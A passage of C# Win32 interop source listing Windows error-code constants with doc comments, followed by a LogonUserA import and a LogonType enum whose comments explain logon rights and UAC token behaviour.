        /// The DHCP client has obtained an IP address that is already in use on the network. The local interface will be disabled until the DHCP client can obtain a new address.
        /// </summary>
        public const int ERROR_DHCP_ADDRESS_CONFLICT = 4100;
        /// <summary>
        /// The GUID passed was not recognized as valid by a WMI data provider.
        /// </summary>
        public const int ERROR_WMI_GUID_NOT_FOUND = 4200;
        /// <summary>
        /// The instance name passed was not recognized as valid by a WMI data provider.
        /// </summary>
        public const int ERROR_WMI_INSTANCE_NOT_FOUND = 4201;
        /// <summary>
        /// The data item ID passed was not recognized as valid by a WMI data provider.
        /// </summary>
        public const int ERROR_WMI_ITEMID_NOT_FOUND = 4202;
        /// <summary>
        /// The WMI request could not be completed and should be retried.
        /// </summary>
        public const int ERROR_WMI_TRY_AGAIN = 4203;
        /// <summary>
        /// The WMI data provider could not be located.
        /// </summary>
        public const int ERROR_WMI_DP_NOT_FOUND = 4204;
        /// <summary>
        /// The WMI data provider references an instance set that has not been registered.
        /// </summary>
        public const int ERROR_WMI_UNRESOLVED_INSTANCE_REF = 4205;
        /// <summary>
        /// The WMI data block or event notification has already been enabled.
        /// </summary>
        public const int ERROR_WMI_ALREADY_ENABLED = 4206;
        /// <summary>
        /// The WMI data block is no longer available.
        /// </summary>
        public const int ERROR_WMI_GUID_DISCONNECTED = 4207;
        /// <summary>
        /// The WMI data service is not available.
        /// </summary>
        public const int ERROR_WMI_SERVER_UNAVAILABLE = 4208;
        /// <summary>
        /// The WMI data provider failed to carry out the request.
        /// </summary>
        public const int ERROR_WMI_DP_FAILED = 4209;
        /// <summary>
        /// The WMI MOF information is not valid.
        /// </summary>
        public const int ERROR_WMI_INVALID_MOF = 4210;
        /// <summary>
        /// The WMI registration information is not valid.
        /// </summary>
        public const int ERROR_WMI_INVALID_REGINFO = 4211;
        /// <summary>
        /// The WMI data block or event notification has already been disabled.
        /// </summary>
        public const int ERROR_WMI_ALREADY_DISABLED = 4212;
        /// <summary>
        /// The WMI data item or data block is read only.
        /// </summary>
        public const int ERROR_WMI_READ_ONLY = 4213;
        /// <summary>
        /// The WMI data item or data block could not be changed.
        /// </summary>
        public const int ERROR_WMI_SET_FAILURE = 4214;
        /// <summary>
        /// The media identifier does not represent a valid medium.
        /// </summary>
        public const int ERROR_INVALID_MEDIA = 4300;
        /// <summary>
        /// The library identifier does not represent a valid library.
        /// </summary>
        public const int ERROR_INVALID_LIBRARY = 4301;
        /// <summary>
        /// The media pool identifier does not represent a valid media pool.
        /// </summary>
        public const int ERROR_INVALID_MEDIA_POOL = 4302;
        /// <summary>
        /// The drive and medium are not compatible or exist in different libraries.
        /// </summary>
        public const int ERROR_DRIVE_MEDIA_MISMATCH = 4303;
        /// <summary>
        /// The medium currently exists in an offline library and must be online to perform this operation.
        /// </summary>
        public const int ERROR_MEDIA_OFFLINE = 4304;
        /// <summary>
        /// The operation cannot be performed on an offline library.
        /// </summary>
        public const int ERROR_LIBRARY_OFFLINE = 4305;
        /// <summary>
        /// The library, drive, or media pool is empty.
        /// </summary>
        public const int ERROR_EMPTY = 4306;
        /// <summary>
        /// The library, drive, or media pool must be empty to perform this operation.
        /// </summary>
        public const int ERROR_NOT_EMPTY = 4307;
        /// <summary>
        /// No media is currently available in this media pool or library.
        /// </summary>
        public const int ERROR_MEDIA_UNAVAILABLE = 4308;
        /// <summary>
        /// A resource required for this operation is disabled.
        /// </summary>
        public const int ERROR_RESOURCE_DISABLED = 4309;
        /// <summary>
        /// The media identifier does not represent a valid cleaner.
        /// </summary>
        public const int ERROR_INVALID_CLEANER = 4310;
        /// <summary>
        /// The drive cannot be cleaned or does not support cleaning.
        /// </summary>
        public const int ERROR_UNABLE_TO_CLEAN = 4311;
        /// <summary>
        /// The object identifier does not represent a valid object.
        /// </summary>
        public const int ERROR_OBJECT_NOT_FOUND = 4312;
        /// <summary>
        /// Unable to read from or write to the database.
        /// </summary>
        public const int ERROR_DATABASE_FAILURE = 4313;
        /// <summary>
        /// The database is full.
        /// </summary>
        public const int ERROR_DATABASE_FULL = 4314;
        /// <summary>
        /// The medium is not compatible with the device or media pool.
        /// </summary>
        public const int ERROR_MEDIA_INCOMPATIBLE = 4315;
        /// <summary>
        /// The resource required for this operation does not exist.
        /// </summary>
        public const int ERROR_RESOURCE_NOT_PRESENT = 4316;
        /// <summary>
        /// The operation identifier is not valid.
        /// </summary>
        public const int ERROR_INVALID_OPERATION = 4317;
        /// <summary>
        /// The media is not mounted or ready for use.
        /// </summary>
        public const int ERROR_MEDIA_NOT_AVAILABLE = 4318;
        /// <summary>
        /// The device is not ready for use.
        /// </summary>
        public const int ERROR_DEVICE_NOT_AVAILABLE = 4319;
        /// <summary>
        /// The operator or administrator has refused the request.
        /// </summary>
        public const int ERROR_REQUEST_REFUSED = 4320;
        /// <summary>
        /// The drive identifier does not represent a valid drive.
        /// </summary>
        public const int ERROR_INVALID_DRIVE_OBJECT = 4321;
        /// <summary>
        /// Library is full.  No slot is available for use.
        /// </summary>
        public const int ERROR_LIBRARY_FULL = 4322;
        /// <summary>
        /// The transport cannot access the medium.
        /// </summary>
        public const int ERROR_MEDIUM_NOT_ACCESSIBLE = 4323;
        /// <summary>
        /// Unable to load the medium into the drive.
        /// </summary>
        public const int ERROR_UNABLE_TO_LOAD_MEDIUM = 4324;
        /// <summary>
        /// Unable to retrieve the drive status.
        /// </summary>
        public const int ERROR_UNABLE_TO_INVENTORY_DRIVE = 4325;
        /// <summary>
        /// Unable to retrieve the slot status.
        /// </summary>
        public const int ERROR_UNABLE_TO_INVENTORY_SLOT = 4326;
        /// <summary>
        /// Unable to retrieve status about the transport.
        /// </summary>
        public const int ERROR_UNABLE_TO_INVENTORY_TRANSPORT = 4327;
        /// <summary>
        /// Cannot use the transport because it is already in use.
        /// </summary>
        public const int ERROR_TRANSPORT_FULL = 4328;
        /// <summary>
        /// Unable to open or close the inject/eject port.
        /// </summary>
        public const int ERROR_CONTROLLING_IEPORT = 4329;
        /// <summary>
        /// Unable to eject the medium because it is in a drive.
        /// </summary>
        public const int ERROR_UNABLE_TO_EJECT_MOUNTED_MEDIA = 4330;
        /// <summary>
        /// A cleaner slot is already reserved.
        /// </summary>
        public const int ERROR_CLEANER_SLOT_SET = 4331;
        /// <summary>
        /// A cleaner slot is not reserved.
        /// </summary>
        public const int ERROR_CLEANER_SLOT_NOT_SET = 4332;
        /// <summary>
        /// The cleaner cartridge has performed the maximum number of drive cleanings.
        /// </summary>
        public const int ERROR_CLEANER_CARTRIDGE_SPENT = 4333;
        /// <summary>
        /// Unexpected on-medium identifier.
        /// </summary>
        public const int ERROR_UNEXPECTED_OMID = 4334;
        /// <summary>
        /// The last remaining item in this group or resource cannot be deleted.
        /// </summary>
        public const int ERROR_CANT_DELETE_LAST_ITEM = 4335;
        /// <summary>
        /// The message provided exceeds the maximum size allowed for this parameter.
        /// </summary>
        public const int ERROR_MESSAGE_EXCEEDS_MAX_SIZE = 4336;
        /// <summary>
        /// The volume contains system or paging files.
        /// </summary>
        public const int ERROR_VOLUME_CONTAINS_SYS_FILES = 4337;
        /// <summary>
        /// The media type cannot be removed from this library since at least one drive in the library reports it can support this media type.
        /// </summary>
        public const int ERROR_INDIGENOUS_TYPE = 4338;
        /// <summary>
        /// This offline media cannot be mounted on this system since no enabled drives are present which can be used.
        /// </summary>
        public const int ERROR_NO_SUPPORTING_DRIVES = 4339;
        /// <summary>
        /// A cleaner cartridge is present in the tape library.
        /// </summary>
        public const int ERROR_CLEANER_CARTRIDGE_INSTALLED = 4340;
        /// <summary>
        /// The remote storage service was not able to recall the file.
        /// </summary>
        public const int ERROR_FILE_OFFLINE = 4350;
        /// <summary>
        /// The remote storage service is not operational at this time.
        /// </summary>
        public const int ERROR_REMOTE_STORAGE_NOT_ACTIVE = 4351;
        /// <summary>
        /// The remote storage service encountered a media error.
        /// </summary>
        public const int ERROR_REMOTE_STORAGE_MEDIA_ERROR = 4352;
        /// <summary>
        /// The file or directory is not a reparse point.
        /// </summary>
        public const int ERROR_NOT_A_REPARSE_POINT = 4390;
        /// <summary>
        /// The reparse point attribute cannot be set because it conflicts with an existing attribute.
        /// </summary>
        public const int ERROR_REPARSE_ATTRIBUTE_CONFLICT = 4391;
        /// <summary>
        /// The data present in the reparse point buffer is invalid.
        /// </summary>
        public const int ERROR_INVALID_REPARSE_DATA = 4392;
        /// <summary>
        /// The tag present in the reparse point buffer is invalid.
        /// </summary>
        public const int ERROR_REPARSE_TAG_INVALID = 4393;
        /// <summary>
        /// There is a mismatch between the tag specified in the request and the tag present in the reparse point.
        /// </summary>
        public const int ERROR_REPARSE_TAG_MISMATCH = 4394;
        /// <summary>
        /// Single Instance Storage is not available on this volume.
        /// </summary>
        public const int ERROR_VOLUME_NOT_SIS_ENABLED = 4500;
        /// <summary>
        /// The cluster resource cannot be moved to another group because other resources are dependent on it.
        /// </summary>
        public const int ERROR_DEPENDENT_RESOURCE_EXISTS = 5001;
        /// <summary>
        /// The cluster resource dependency cannot be found.
        /// </summary>
        public const int ERROR_DEPENDENCY_NOT_FOUND = 5002;
        /// <summary>
        /// The cluster resource cannot be made dependent on the specified resource because it is already dependent.
        /// </summary>
        public const int ERROR_DEPENDENCY_ALREADY_EXISTS = 5003;
        /// <summary>
        /// The cluster resource is not online.
        /// </summary>
        public const int ERROR_RESOURCE_NOT_ONLINE = 5004;
        /// <summary>
        /// A cluster node is not available for this operation.
        /// </summary>
        public const int ERROR_HOST_NODE_NOT_AVAILABLE = 5005;
        /// <summary>
        /// The cluster resource is not available.
        /// </summary>
        public const int ERROR_RESOURCE_NOT_AVAILABLE = 5006;
        /// <summary>
        /// The cluster resource could not be found.
        /// </summary>
        public const int ERROR_RESOURCE_NOT_FOUND = 5007;
        /// <summary>
        /// The cluster is being shut down.
        /// </summary>
        public const int ERROR_SHUTDOWN_CLUSTER = 5008;
        /// <summary>
        /// A cluster node cannot be evicted from the cluster unless the node is down or it is the last node.
        /// </summary>
        public const int ERROR_CANT_EVICT_ACTIVE_NODE = 5009;
        /// <summary>
        /// The object already exists.
        /// </summary>
        public const int ERROR_OBJECT_ALREADY_EXISTS = 5010;
        /// <summary>
        /// The object is already in the list.
        /// </summary>
        public const int ERROR_OBJECT_IN_LIST = 5011;
        /// <summary>
        /// The cluster group is not available for any new requests.
        /// </summary>
        public const int ERROR_GROUP_NOT_AVAILABLE = 5012;
        /// <summary>
        /// The cluster group could not be found.
        /// </summary>
        public const int ERROR_GROUP_NOT_FOUND = 5013;
        /// <summary>
        /// The operation could not be completed because the cluster group is not online.
        /// </summary>
        public const int ERROR_GROUP_NOT_ONLINE = 5014;
        /// <summary>
        /// The cluster node is not the owner of the resource.
        /// </summary>
        public const int ERROR_HOST_NODE_NOT_RESOURCE_OWNER = 5015;
        /// <summary>
        /// The cluster node is not the owner of the group.
        /// </summary>
        public const int ERROR_HOST_NODE_NOT_GROUP_OWNER = 5016;
        /// <summary>
        /// The cluster resource could not be created in the specified resource monitor.
        /// </summary>
        public const int ERROR_RESMON_CREATE_FAILED = 5017;
        /// <summary>
        /// The cluster resource could not be brought online by the resource monitor.
        /// </summary>
        public const int ERROR_RESMON_ONLINE_FAILED = 5018;
        /// <summary>
        /// The operation could not be completed because the cluster resource is online.
        /// </summary>
        public const int ERROR_RESOURCE_ONLINE = 5019;
        /// <summary>
        /// The cluster resource could not be deleted or brought offline because it is the quorum resource.
        /// </summary>
        public const int ERROR_QUORUM_RESOURCE = 5020;
        /// <summary>
        /// The cluster could not make the specified resource a quorum resource because it is not capable of being a quorum resource.
        /// </summary>
        public const int ERROR_NOT_QUORUM_CAPABLE = 5021;
        /// <summary>
        /// The cluster software is shutting down.
        /// </summary>
        public const int ERROR_CLUSTER_SHUTTING_DOWN = 5022;
        /// <summary>
        /// The group or resource is not in the correct state to perform the requested operation.
        /// </summary>
        public const int ERROR_INVALID_STATE = 5023;
        /// <summary>
        /// The properties were stored but not all changes will take effect until the next time the resource is brought online.
        /// </summary>
        public const int ERROR_RESOURCE_PROPERTIES_STORED = 5024;
        /// <summary>
        /// The cluster could not make the specified resource a quorum resource because it does not belong to a shared storage class.
        /// </summary>
        public const int ERROR_NOT_QUORUM_CLASS = 5025;
        /// <summary>
        /// The cluster resource could not be deleted since it is a core resource.
        /// </summary>
        public const int ERROR_CORE_RESOURCE = 5026;
        /// <summary>
        /// The quorum resource failed to come online.
        /// </summary>
        public const int ERROR_QUORUM_RESOURCE_ONLINE_FAILED = 5027;
        /// <summary>
        /// The quorum log could not be created or mounted successfully.
        /// </summary>
        public const int ERROR_QUORUMLOG_OPEN_FAILED = 5028;
        /// <summary>
        /// The cluster log is corrupt.
        /// </summary>
        public const int ERROR_CLUSTERLOG_CORRUPT = 5029;
        /// <summary>
        /// The record could not be written to the cluster log since it exceeds the maximum size.
        /// </summary>
        public const int ERROR_CLUSTERLOG_RECORD_EXCEEDS_MAXSIZE = 5030;
        /// <summary>
        /// The cluster log exceeds its maximum size.
        /// </summary>
        public const int ERROR_CLUSTERLOG_EXCEEDS_MAXSIZE = 5031;
        /// <summary>
        /// No checkpoint record was found in the cluster log.
        /// </summary>
        public const int ERROR_CLUSTERLOG_CHKPOINT_NOT_FOUND = 5032;
        /// <summary>
        /// The minimum required disk space needed for logging is not available.
        /// </summary>
        public const int ERROR_CLUSTERLOG_NOT_ENOUGH_SPACE = 5033;
        /// <summary>
        /// The cluster node failed to take control of the quorum resource because the resource is owned by another active node.
        /// </summary>
        public const int ERROR_QUORUM_OWNER_ALIVE = 5034;
        /// <summary>
        /// A cluster network is not available for this operation.
        /// </summary>
        public const int ERROR_NETWORK_NOT_AVAILABLE = 5035;
        /// <summary>
        /// A cluster node is not available for this operation.
        /// </summary>
        public const int ERROR_NODE_NOT_AVAILABLE = 5036;
        /// <summary>
        /// All cluster nodes must be running to perform this operation.
        /// </summary>
        public const int ERROR_ALL_NODES_NOT_AVAILABLE = 5037;
        /// <summary>
        /// A cluster resource failed.
        /// </summary>
        public const int ERROR_RESOURCE_FAILED = 5038;
        /// <summary>
        /// The cluster node is not valid.
        /// </summary>
        public const int ERROR_CLUSTER_INVALID_NODE = 5039;
        /// <summary>
        /// The cluster node already exists.
        /// </summary>
        public const int ERROR_CLUSTER_NODE_EXISTS = 5040;
        /// <summary>
        /// A node is in the process of joining the cluster.
        /// </summary>
        public const int ERROR_CLUSTER_JOIN_IN_PROGRESS = 5041;
        /// <summary>
        /// The cluster node was not found.
        /// </summary>
        public const int ERROR_CLUSTER_NODE_NOT_FOUND = 5042;
        /// <summary>
        /// The cluster local node information was not found.
        /// </summary>
        public const int ERROR_CLUSTER_LOCAL_NODE_NOT_FOUND = 5043;
        /// <summary>
        /// The cluster network already exists.
        /// </summary>
        public const int ERROR_CLUSTER_NETWORK_EXISTS = 5044;
        /// <summary>
        /// The cluster network was not found.
        /// </summary>
        public const int ERROR_CLUSTER_NETWORK_NOT_FOUND = 5045;
        /// <summary>
        /// The cluster network interface already exists.
        /// </summary>
        public const int ERROR_CLUSTER_NETINTERFACE_EXISTS = 5046;
        /// <summary>
        /// The cluster network interface was not found.
        /// </summary>
        public const int ERROR_CLUSTER_NETINTERFACE_NOT_FOUND = 5047;
        /// <summary>
        /// The cluster request is not valid for this object.
        /// </summary>
        public const int ERROR_CLUSTER_INVALID_REQUEST = 5048;
        /// <summary>
        /// The cluster network provider is not valid.
        /// </summary>
        public const int ERROR_CLUSTER_INVALID_NETWORK_PROVIDER = 5049;
        /// <summary>
        /// The cluster node is down.
        /// </summary>
        public const int ERROR_CLUSTER_NODE_DOWN = 5050;
        /// <summary>
        /// The cluster node is not reachable.
        /// </summary>
        public const int ERROR_CLUSTER_NODE_UNREACHABLE = 5051;
        /// <summary>
        /// The cluster node is not a member of the cluster.
        /// </summary>
        public const int ERROR_CLUSTER_NODE_NOT_MEMBER = 5052;
        /// <summary>
        /// A cluster join operation is not in progress.
        /// </summary>
        public const int ERROR_CLUSTER_JOIN_NOT_IN_PROGRESS = 5053;
        /// <summary>
        /// The cluster network is not valid.
        /// </summary>
        public const int ERROR_CLUSTER_INVALID_NETWORK = 5054;
        /// <summary>
        /// The cluster node is up.
        /// </summary>
        public const int ERROR_CLUSTER_NODE_UP = 5056;
        /// <summary>
        /// The cluster IP address is already in use.
        /// </summary>
        public const int ERROR_CLUSTER_IPADDR_IN_USE = 5057;
        /// <summary>
        /// The cluster node is not paused.
        /// </summary>
        public const int ERROR_CLUSTER_NODE_NOT_PAUSED = 5058;
        /// <summary>
        /// No cluster security context is available.
        /// </summary>
        public const int ERROR_CLUSTER_NO_SECURITY_CONTEXT = 5059;
        /// <summary>
        /// The cluster network is not configured for internal cluster communication.
        /// </summary>
        public const int ERROR_CLUSTER_NETWORK_NOT_INTERNAL = 5060;
        /// <summary>
        /// The cluster node is already up.
        /// </summary>
        public const int ERROR_CLUSTER_NODE_ALREADY_UP = 5061;
        /// <summary>
        /// The cluster node is already down.
        /// </summary>
        public const int ERROR_CLUSTER_NODE_ALREADY_DOWN = 5062;
        /// <summary>
        /// The cluster network is already online.
        /// </summary>
        public const int ERROR_CLUSTER_NETWORK_ALREADY_ONLINE = 5063;
        /// <summary>
        /// The cluster network is already offline.
        /// </summary>
        public const int ERROR_CLUSTER_NETWORK_ALREADY_OFFLINE = 5064;
        /// <summary>
        /// The cluster node is already a member of the cluster.
        /// </summary>
        public const int ERROR_CLUSTER_NODE_ALREADY_MEMBER = 5065;
        /// <summary>
        /// The cluster network is the only one configured for internal cluster communication between two or more active cluster nodes. The internal communication capability cannot be removed from the network.
        /// </summary>
        public const int ERROR_CLUSTER_LAST_INTERNAL_NETWORK = 5066;
        /// <summary>
        /// One or more cluster resources depend on the network to provide service to clients. The client access capability cannot be removed from the network.
        /// </summary>
        public const int ERROR_CLUSTER_NETWORK_HAS_DEPENDENTS = 5067;
        /// <summary>
        /// This operation cannot be performed on the cluster resource as it the quorum resource. You may not bring the quorum resource offline or modify its possible owners list.
        /// </summary>
        public const int ERROR_INVALID_OPERATION_ON_QUORUM = 5068;
        /// <summary>
        /// The cluster quorum resource is not allowed to have any dependencies.
        /// </summary>
        public const int ERROR_DEPENDENCY_NOT_ALLOWED = 5069;
        /// <summary>
        /// The cluster node is paused.
        /// </summary>
        public const int ERROR_CLUSTER_NODE_PAUSED = 5070;
        /// <summary>
        /// The cluster resource cannot be brought online. The owner node cannot run this resource.
        /// </summary>
        public const int ERROR_NODE_CANT_HOST_RESOURCE = 5071;
        /// <summary>
        /// The cluster node is not ready to perform the requested operation.
        /// </summary>
        public const int ERROR_CLUSTER_NODE_NOT_READY = 5072;
        /// <summary>
        /// The cluster node is shutting down.
        /// </summary>
        public const int ERROR_CLUSTER_NODE_SHUTTING_DOWN = 5073;
        /// <summary>
        /// The cluster join operation was aborted.
        /// </summary>
        public const int ERROR_CLUSTER_JOIN_ABORTED = 5074;
        /// <summary>
        /// The cluster join operation failed due to incompatible software versions between the joining node and its sponsor.
        /// </summary>
        public const int ERROR_CLUSTER_INCOMPATIBLE_VERSIONS = 5075;
        /// <summary>
        /// This resource cannot be created because the cluster has reached the limit on the number of resources it can monitor.
        /// </summary>
        public const int ERROR_CLUSTER_MAXNUM_OF_RESOURCES_EXCEEDED = 5076;
        /// <summary>
        /// The system configuration changed during the cluster join or form operation. The join or form operation was aborted.
        /// </summary>
        public const int ERROR_CLUSTER_SYSTEM_CONFIG_CHANGED = 5077;
        /// <summary>
        /// The specified resource type was not found.
        /// </summary>
        public const int ERROR_CLUSTER_RESOURCE_TYPE_NOT_FOUND = 5078;
        /// <summary>
        /// The specified node does not support a resource of this type.  This may be due to version inconsistencies or due to the absence of the resource DLL on this node.
        /// </summary>
        public const int ERROR_CLUSTER_RESTYPE_NOT_SUPPORTED = 5079;
        /// <summary>
        /// The specified resource name is not supported by this resource DLL. This may be due to a bad (or changed) name supplied to the resource DLL.
        /// </summary>
        public const int ERROR_CLUSTER_RESNAME_NOT_FOUND = 5080;
        /// <summary>
        /// No authentication package could be registered with the RPC server.
        /// </summary>
        public const int ERROR_CLUSTER_NO_RPC_PACKAGES_REGISTERED = 5081;
        /// <summary>
        /// You cannot bring the group online because the owner of the group is not in the preferred list for the group. To change the owner node for the group, move the group.
        /// </summary>
        public const int ERROR_CLUSTER_OWNER_NOT_IN_PREFLIST = 5082;
        /// <summary>
        /// The join operation failed because the cluster database sequence number has changed or is incompatible with the locker node. This may happen during a join operation if the cluster database was changing during the join.
        /// </summary>
        public const int ERROR_CLUSTER_DATABASE_SEQMISMATCH = 5083;
        /// <summary>
        /// The resource monitor will not allow the fail operation to be performed while the resource is in its current state. This may happen if the resource is in a pending state.
        /// </summary>
        public const int ERROR_RESMON_INVALID_STATE = 5084;
        /// <summary>
        /// A non locker code got a request to reserve the lock for making global updates.
        /// </summary>
        public const int ERROR_CLUSTER_GUM_NOT_LOCKER = 5085;
        /// <summary>
        /// The quorum disk could not be located by the cluster service.
        /// </summary>
        public const int ERROR_QUORUM_DISK_NOT_FOUND = 5086;
        /// <summary>
        /// The backed up cluster database is possibly corrupt.
        /// </summary>
        public const int ERROR_DATABASE_BACKUP_CORRUPT = 5087;
        /// <summary>
        /// A DFS root already exists in this cluster node.
        /// </summary>
        public const int ERROR_CLUSTER_NODE_ALREADY_HAS_DFS_ROOT = 5088;
        /// <summary>
        /// An attempt to modify a resource property failed because it conflicts with another existing property.
        /// </summary>
        public const int ERROR_RESOURCE_PROPERTY_UNCHANGEABLE = 5089;
        /// <summary>
        /// An operation was attempted that is incompatible with the current membership state of the node.
        /// </summary>
        public const int ERROR_CLUSTER_MEMBERSHIP_INVALID_STATE = 5890;
        /// <summary>
        /// The quorum resource does not contain the quorum log.
        /// </summary>
        public const int ERROR_CLUSTER_QUORUMLOG_NOT_FOUND = 5891;
        /// <summary>
        /// The membership engine requested shutdown of the cluster service on this node.
        /// </summary>
        public const int ERROR_CLUSTER_MEMBERSHIP_HALT = 5892;
        /// <summary>
        /// The join operation failed because the cluster instance ID of the joining node does not match the cluster instance ID of the sponsor node.
        /// </summary>
        public const int ERROR_CLUSTER_INSTANCE_ID_MISMATCH = 5893;
        /// <summary>
        /// A matching network for the specified IP address could not be found. Please also specify a subnet mask and a cluster network.
        /// </summary>
        public const int ERROR_CLUSTER_NETWORK_NOT_FOUND_FOR_IP = 5894;
        /// <summary>
        /// The actual data type of the property did not match the expected data type of the property.
        /// </summary>
        public const int ERROR_CLUSTER_PROPERTY_DATA_TYPE_MISMATCH = 5895;
        /// <summary>
        /// The cluster node was evicted from the cluster successfully, but the node was not cleaned up.  Extended status information explaining why the node was not cleaned up is available.
        /// </summary>
        public const int ERROR_CLUSTER_EVICT_WITHOUT_CLEANUP = 5896;
        /// <summary>
        /// Two or more parameter values specified for a resource's properties are in conflict.
        /// </summary>
        public const int ERROR_CLUSTER_PARAMETER_MISMATCH = 5897;
        /// <summary>
        /// This computer cannot be made a member of a cluster.
        /// </summary>
        public const int ERROR_NODE_CANNOT_BE_CLUSTERED = 5898;
        /// <summary>
        /// This computer cannot be made a member of a cluster because it does not have the correct version of Windows installed.
        /// </summary>
        public const int ERROR_CLUSTER_WRONG_OS_VERSION = 5899;
        /// <summary>
        /// A cluster cannot be created with the specified cluster name because that cluster name is already in use. Specify a different name for the cluster.
        /// </summary>
        public const int ERROR_CLUSTER_CANT_CREATE_DUP_CLUSTER_NAME = 5900;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_CLUSCFG_ALREADY_COMMITTED = 5901;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_CLUSCFG_ROLLBACK_FAILED = 5902;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_CLUSCFG_SYSTEM_DISK_DRIVE_LETTER_CONFLICT = 5903;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_CLUSTER_OLD_VERSION = 5904;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_CLUSTER_MISMATCHED_COMPUTER_ACCT_NAME = 5905;
        /// <summary>
        /// The specified file could not be encrypted.
        /// </summary>
        public const int ERROR_ENCRYPTION_FAILED = 6000;
        /// <summary>
        /// The specified file could not be decrypted.
        /// </summary>
        public const int ERROR_DECRYPTION_FAILED = 6001;
        /// <summary>
        /// The specified file is encrypted and the user does not have the ability to decrypt it.
        /// </summary>
        public const int ERROR_FILE_ENCRYPTED = 6002;
        /// <summary>
        /// There is no valid encryption recovery policy configured for this system.
        /// </summary>
        public const int ERROR_NO_RECOVERY_POLICY = 6003;
        /// <summary>
        /// The required encryption driver is not loaded for this system.
        /// </summary>
        public const int ERROR_NO_EFS = 6004;
        /// <summary>
        /// The file was encrypted with a different encryption driver than is currently loaded.
        /// </summary>
        public const int ERROR_WRONG_EFS = 6005;
        /// <summary>
        /// There are no EFS keys defined for the user.
        /// </summary>
        public const int ERROR_NO_USER_KEYS = 6006;
        /// <summary>
        /// The specified file is not encrypted.
        /// </summary>
        public const int ERROR_FILE_NOT_ENCRYPTED = 6007;
        /// <summary>
        /// The specified file is not in the defined EFS export format.
        /// </summary>
        public const int ERROR_NOT_EXPORT_FORMAT = 6008;
        /// <summary>
        /// The specified file is read only.
        /// </summary>
        public const int ERROR_FILE_READ_ONLY = 6009;
        /// <summary>
        /// The directory has been disabled for encryption.
        /// </summary>
        public const int ERROR_DIR_EFS_DISALLOWED = 6010;
        /// <summary>
        /// The server is not trusted for remote encryption operation.
        /// </summary>
        public const int ERROR_EFS_SERVER_NOT_TRUSTED = 6011;
        /// <summary>
        /// Recovery policy configured for this system contains invalid recovery certificate.
        /// </summary>
        public const int ERROR_BAD_RECOVERY_POLICY = 6012;
        /// <summary>
        /// The encryption algorithm used on the source file needs a bigger key buffer than the one on the destination file.
        /// </summary>
        public const int ERROR_EFS_ALG_BLOB_TOO_BIG = 6013;
        /// <summary>
        /// The disk partition does not support file encryption.
        /// </summary>
        public const int ERROR_VOLUME_NOT_SUPPORT_EFS = 6014;
        /// <summary>
        /// This machine is disabled for file encryption.
        /// </summary>
        public const int ERROR_EFS_DISABLED = 6015;
        /// <summary>
        /// A newer system is required to decrypt this encrypted file.
        /// </summary>
        public const int ERROR_EFS_VERSION_NOT_SUPPORT = 6016;
        /// <summary>
        /// The list of servers for this workgroup is not currently available
        /// </summary>
        public const int ERROR_NO_BROWSER_SERVERS_FOUND = 6118;
        /// <summary>
        /// The Task Scheduler service must be configured to run in the System account to function properly.  Individual tasks may be configured to run in other accounts.
        /// </summary>
        public const int SCHED_E_SERVICE_NOT_LOCALSYSTEM = 6200;
    }

    #endregion

    #endregion
    


    #region -- Win32 APIs, Structures, Enums --

    #region UDTs


    /// <summary>
    /// Create Process Status (for CreateProcess, CreateProcessAsUser, etc)
    /// </summary>
    public class ProcessCreateStatus
    {
        public bool Success;

        /// <summary>
        /// Process handle information to be closed by the caller to avoid handle leaking
        /// </summary>
        public PROCESS_INFORMATION ProcessInfo;

        public int ReturnCode;

        public string ErrorText;
    }

    #endregion

    #region LogonType struct & LogonUser API

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LogonUserA
    (
        string lpszUserName,
        string lpszDomain,
        string lpszPassword,
        int dwLogonType,
        int dwLogonProvider,
        out IntPtr phToken
    );

    //
    // Logon Types Enum for LogonUser or LsaLogonUser (SECURITY_LOGON_TYPE)
    //

    /// <summary>
    /// This structure is SECURITY_LOGON_TYPE utilized by LsaLogonUser but also LogonUser
    /// 
    /// When UAC is on, then any other logon right selected other than 'Interactive' (which provides a privileged-cached, Medium IL "filtered" token) will result in a
    ///     high IL token (an re-evaluates privileges in real-time) returned from LogonUser (as long as the user is within the Administrators group)
    /// 
    /// Type Descriptions:
    ///         - LogonUserExExW - docs.microsoft.com/en-us/windows/win32/secauthn/logonuserexexw
    ///         - serverfault.com/questions/682842/windows-domain-controller-authentication-logon-logging-and-forensics
    ///         - SECURITY_LOGON_TYPE (the structure of these used for LsaLogonUSer) - https:// msdn.microsoft.com/en-us/library/windows/desktop/aa380129%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396
    ///         - LogonUser types (LOGON32_...) -     https:// msdn.microsoft.com/en-us/library/windows/desktop/aa378184(v=vs.85).aspx
    ///         - Logon Types in eventlogs, and more details for each of the following below
    ///           itprotoday.com/management-mobility/q-what-are-different-windows-logon-types-can-show-windows-event-log
    /// 
    /// LsaLogonUser info:
    ///     If LogonType is Interactive or Batch, a primary token is generated to represent the new user. 
    ///     If LogonType is Network, an impersonation token is generated.
    /// 
    /// And more info: http://techgenix.com/logon-types/
    /// 
    /// Note: There are 10 total Logon Rights (Privileges / User Rights Assignment), 5 for Allowing and 5 specifically for denying:
    ///       1. Interactive            - SeInteractiveLogonRight,          SeDenyInteractiveLogonRight
    ///       2. Network                - SeNetworkLogonRight,              SeDenyNetworkLogonRight
    ///       3. Batch                  - SeBatchLogonRight,                SeDenyBatchLogonRight
    ///       4. Service                - SeServiceLogonRight,              SeDenyServiceLogonRight
    ///       5. RemoteInteractive      - SeRemoteInteractiveLogonRight,    SeDenyRemoteInteractiveLogonRight
    /// </summary>
    public enum LogonType
    {
        /// <summary>
        /// 2 - LOGON32_LOGON_INTERACTIVE - Interactively logged on (locally or remotely) users who will be interactively using the computer, such as a user being logged on by a terminal server, remote shell, or similar process.
        ///                                 "This logon type has the additional expense of caching logon information for disconnected operations; therefore, it is inappropriate for some client/server applications, such as a mail server."
        /// 
        /// Requires                SeInteractiveLogonRight Logon Right - Granted to BUILTIN\Users
        /// Unless included in      SeDenyInteractiveLogonRight - BUILTIN\Guests
        /// </summary>
        Interactive = 2,

        /// <summary>
        /// 3 - LOGON32_LOGON_NETWORK - Accessing system via network
        /// In most cases, the returned handle is a Primary Token (TokenPrimary: 1) that you can use in calls to the CreateProcessAsUser function. 
